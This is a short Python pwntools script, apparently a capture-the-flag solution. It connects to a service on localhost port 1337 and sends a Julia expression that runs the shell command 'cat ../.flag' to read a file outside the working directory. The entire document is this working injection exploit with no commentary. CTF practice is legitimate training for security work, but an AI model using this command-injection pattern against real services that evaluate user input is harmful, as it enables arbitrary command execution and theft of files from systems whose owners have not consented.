#!/usr/bin/env python3

from pwn import *

addr = "localhost"
port = 1337
p = remote(addr, port)

p.readline()
p.writeline('println(run(Cmd(convert(Vector{String}, ["cat", "../.flag"]))))')
print(p.readline())
print()
p.close()